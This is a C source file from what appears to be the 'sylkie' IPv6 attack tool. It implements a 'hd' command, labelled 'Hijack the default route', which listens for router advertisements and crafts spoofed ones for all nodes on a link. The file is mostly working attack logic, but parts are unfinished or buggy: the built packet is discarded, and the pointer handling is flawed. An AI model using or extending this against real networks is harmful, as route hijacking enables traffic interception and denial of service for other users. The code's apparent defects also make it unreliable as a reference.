// Copyright (c) 2017 Daniel L. Robertson
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <errno.h>
#include <stdio.h>
#include <string.h>

#include <sender.h>
#include <sender_map.h>

#include <netinet/icmp6.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <sylkie_config.h>

#ifdef BUILD_JSON
#include <json-c/json.h>
#endif

#include <packet.h>
#include <ndp.h>
#include <cfg.h>
#include <cmds.h>

static struct in6_addr s_all_nodes_ip = {
    .s6_addr = {0xff, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x01}};
static const u_int8_t s_all_nodes_eth[] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};

const struct cfg_parser hd_parsers[] = {
    {'h', "help", CFG_BOOL, "print helpful usage information"},
    {'i', "interface", CFG_STRING,
     "network interface that will be used to send packets"},
    {'z', "timeout", CFG_INT, "wait <n> seconds before sending router advert agein"}};

const struct cfg_template *generate_hd_template() {
  static const struct cfg_template ra_templt = {
      .usage = "sylkie hd [OPTIONS]",
      .summary = "Hijack the default route",
      .parsers = hd_parsers,
      .parsers_sz = sizeof(hd_parsers) / sizeof(struct cfg_parser),
      .subcmds = NULL,
      .subcmds_sz = 0};
  return &ra_templt;
}

extern struct known_routers_list * g_kr;

struct sylkie_packet *hd_get_packet(const struct in6_addr *ip_src, const u_int8_t *packet,
                                    size_t len) {
  struct sylkie_packet *pkt = NULL;
  //struct known_routers_list_item *item = NULL;
  struct known_router *kr;
  int i = 0;
  const struct nd_opt_hdr *opt = NULL;
  const struct nd_opt_prefix_info *prefix_opt = NULL;
  const u_int8_t *eth_src = NULL;
  while (i < len) {
    if ((i + sizeof(struct nd_opt_hdr)) < len) {
      opt = (struct nd_opt_hdr*)packet + i;
      i += sizeof(struct nd_opt_hdr);
    } else {
      break;
    }
    if ((i + (opt->nd_opt_len * 8)) < len) {
      if (opt->nd_opt_type == ND_OPT_PREFIX_INFORMATION &&
        opt->nd_opt_len == 4) {
        prefix_opt = (struct nd_opt_prefix_info*)packet + i;
        i += sizeof(struct nd_opt_prefix_info);
      } else if (opt->nd_opt_type == ND_OPT_SOURCE_LINKADDR &&
                 opt->nd_opt_len == 1) {
        eth_src = packet + 2;
        i += 8;
      } else {
        i += (opt->nd_opt_len * 8);
      }
    } else {
      break;
    }
  }
  if (eth_src && prefix_opt) {
    //for (item = g_kr->head; item; item = item->next) {
    //  if (memcmp(&item->value->s_addr, &ip_src, sizeof(struct in6_addr)) == 0 ||
    //      memcmp(&item->value->r_addr, &prefix_opt->nd_opt_pi_prefix,
    //             sizeof(struct in6_addr)) == 0)
    //    return NULL;
    //  }
    //}
    pkt = sylkie_router_advert_create(eth_src, s_all_nodes_eth, ip_src,
                                      &s_all_nodes_ip,
                                      &prefix_opt->nd_opt_pi_prefix,
                                      prefix_opt->nd_opt_pi_prefix_len,
                                      0, eth_src, NULL);
    if (pkt) {
      kr = malloc(sizeof(struct known_router));
      memcpy(&kr->s_addr, &ip_src, sizeof(struct in6_addr));
      memcpy(&kr->r_addr, &prefix_opt->nd_opt_pi_prefix,
             sizeof(struct in6_addr));
      //if (known_routers_list_add(g_kr, kr)) {
        return pkt;
      //} else {
      //  sylkie_packet_free(pkt);
      //  free(kr);
      //  return NULL;
      //}
    } else {
      return NULL;
    }
  } else {
    return NULL;
  }
}

// eth and ip6 are guaranteed to not be null
struct listen_action* action(const struct ethhdr* eth,
                             const struct ip6_hdr* ip6,
                             const u_int8_t *packet, size_t len) {
  struct nd_router_advert *router_advert;
  struct sylkie_packet *pkt = NULL;
  if (len >= sizeof(struct nd_router_advert)) {
    router_advert = (struct nd_router_advert*)packet;
    if (router_advert->nd_ra_hdr.icmp6_type == ND_ROUTER_ADVERT) {
      pkt = hd_get_packet(&ip6->ip6_src, packet + sizeof(struct nd_router_advert),
                          len - sizeof(struct nd_router_advert));
      if (pkt) {
      }
      //item = malloc(sizeof(struct known_router));
      //memcpy(&item->r_addr, &ip->src_addr, sizeof(struct in6_addr));

      //sylkie_router_advert_create(src_mac, dst_mac, src_addr, dst_addr,
      //                            router_addr, prefix, lifetime, tgt_mac, &err);
    }
  }
  return NULL;
}

int hd_parse(struct sylkie_sender_map *ifaces,
             const struct cfg_set *set,
             struct command_lists* cmds) {
  char *iface_name = NULL;
  struct listen_command *lst_cmd = malloc(sizeof(struct listen_command));
  int timeout = 5;

  if (!lst_cmd) {
    fprintf(stderr, "No memory.\n");
    return -1;
  } else {
    lst_cmd->dst = malloc(sizeof(struct in6_addr));
    memcpy(&lst_cmd->dst, &s_all_nodes_ip, sizeof(struct in6_addr));
    lst_cmd->src = NULL;
    lst_cmd->action = action;
  }

  if (cfg_set_find_type(set, "interface", CFG_STRING, &iface_name)) {
    fprintf(stderr, "Must provide an interface to use.\n");
    cfg_set_usage(set, stderr);
    lst_cmd->iface = iface_name;
    return -1;
  }

  cfg_set_find_type(set, "timeout", CFG_INT, &timeout);
  lst_cmd->timeout = timeout;

  if (command_lists_add(cmds, SYLKIE_CMD_LISTEN, lst_cmd)) {
    free(lst_cmd->iface);
    free(lst_cmd->dst);
    free(lst_cmd);
    return -1;
  }

  return 0;
}
